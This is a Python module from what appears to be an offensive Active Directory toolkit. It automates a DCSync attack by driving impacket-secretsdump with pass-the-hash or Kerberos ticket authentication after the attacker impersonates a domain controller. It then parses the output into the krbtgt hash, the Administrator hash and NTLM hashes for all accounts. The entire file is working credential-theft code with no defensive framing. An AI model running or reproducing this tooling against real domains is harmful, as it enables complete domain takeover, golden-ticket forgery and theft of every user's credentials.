"""
DCSync module -- execute DCSync using impacket-secretsdump.

After impersonating a DC via certificate, DCSync extracts domain secrets
including the krbtgt hash.  Prefers pass-the-hash (NT hash from PKINIT)
over Kerberos ccache because DRSUAPI bind with ccache-derived tickets
triggers invalid_checksum on many impacket versions.
"""

import logging
import os
import shutil
import subprocess
import sys
from typing import Any

logger = logging.getLogger("certighost.dcsync")


def _find_secretsdump() -> list[str]:
    """Return the command prefix for secretsdump (venv first, then system)."""
    venv_sd = os.path.join(os.path.dirname(sys.executable), "secretsdump.py")
    if os.path.exists(venv_sd):
        return [sys.executable, venv_sd]
    if shutil.which("impacket-secretsdump"):
        return ["impacket-secretsdump"]
    if shutil.which("secretsdump.py"):
        return ["secretsdump.py"]
    raise RuntimeError(
        "secretsdump not found. Install with: pip install impacket"
    )


async def run_dcsync(
    domain: str,
    dc_ip: str,
    username: str = None,
    ccache_file: str = "dc.ccache",
    target_dc: str = None,
    nt_hash: str = None,
) -> dict[str, Any]:
    """
    DCSync via impacket-secretsdump.

    Uses pass-the-hash when nt_hash is provided (preferred), otherwise
    falls back to Kerberos ccache auth.

    Returns:
        dict with: krbtgt_hash, administrator_hash, all_hashes
    """
    dc_fqdn = target_dc or f"DC01.{domain}"
    sam_user = username.split(".")[0].lower() if username else "dc01"

    logger.info(f"Running DCSync against {dc_ip}...")
    logger.info(f"  Domain:   {domain}")
    logger.info(f"  DC FQDN:  {dc_fqdn}")
    logger.info(f"  Auth:     {'pass-the-hash' if nt_hash else 'Kerberos ccache'}")

    from dns_utils import ensure_dc_resolves
    ensure_dc_resolves(dc_fqdn, dc_ip)

    env = os.environ.copy()
    sd_cmd = _find_secretsdump()

    if nt_hash:
        lm_hash = "aad3b435b51404eeaad3b435b51404ee"
        target = f"{domain}/{sam_user}$@{dc_fqdn}"
        cmd = sd_cmd + [
            "-hashes", f"{lm_hash}:{nt_hash}",
            "-just-dc-ntlm",
            "-target-ip", dc_ip,
            target,
        ]
    else:
        env["KRB5CCNAME"] = os.path.abspath(ccache_file)
        target = f"{domain}/{sam_user}@{dc_fqdn}"
        cmd = sd_cmd + [
            "-k", "-no-pass",
            "-just-dc-ntlm",
            target,
            "-dc-ip", dc_ip,
        ]

    logger.info(f"Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env,
            timeout=120,
        )
    except FileNotFoundError:
        raise RuntimeError(
            "secretsdump not found. Install with: pip install impacket"
        )
    except subprocess.TimeoutExpired:
        raise RuntimeError("secretsdump timed out after 120 seconds")

    output = result.stdout + result.stderr
    if result.returncode != 0:
        raise RuntimeError(f"secretsdump failed: {output}")

    logger.debug(f"secretsdump output:\n{output}")

    parsed = _parse_secretsdump_output(output)

    logger.info("=" * 60)
    logger.info("DCSync complete!")
    logger.info(f"  krbtgt hash:        {parsed.get('krbtgt_hash', 'N/A')}")
    logger.info(f"  Administrator hash: {parsed.get('administrator_hash', 'N/A')}")
    logger.info(f"  Total accounts:     {len(parsed.get('all_hashes', {}))}")
    logger.info(f"  ccache:             {ccache_file}")
    logger.info("=" * 60)

    return parsed


def _parse_secretsdump_output(output: str) -> dict[str, Any]:
    """
    Parse impacket-secretsdump output.

    Expected line format: username:rid:lmhash:nthash:::

    Returns:
        dict with krbtgt_hash, administrator_hash, and all_hashes
    """
    hashes = {}
    for line in output.splitlines():
        if ":::" in line and not line.startswith("["):
            parts = line.split(":")
            if len(parts) >= 4:
                user = parts[0]
                hashes[user] = {
                    "nthash": parts[3],
                    "lmhash": parts[2],
                }

    return {
        "krbtgt_hash": hashes.get("krbtgt", {}).get("nthash"),
        "administrator_hash": hashes.get("Administrator", {}).get("nthash"),
        "all_hashes": hashes,
    }


def verify_dcsync_result(result: dict) -> bool:
    """
    Verify the DCSync result contains expected data.

    Args:
        result: Return value from run_dcsync()

    Returns:
        bool -- True if DCSync produced usable results
    """
    if not result:
        return False

    has_krbtgt = result.get("krbtgt_hash") is not None
    has_admin = result.get("administrator_hash") is not None
    has_hashes = len(result.get("all_hashes", {})) > 0

    success = has_krbtgt and has_hashes

    logger.info("DCSync verification:")
    logger.info(f"  krbtgt:        {'OK' if has_krbtgt else 'MISSING'}")
    logger.info(f"  Administrator: {'OK' if has_admin else 'MISSING'}")
    logger.info(f"  Total hashes:  {len(result.get('all_hashes', {}))}")
    logger.info(f"  Result:        {'SUCCESS' if success else 'FAILURE'}")

    return success
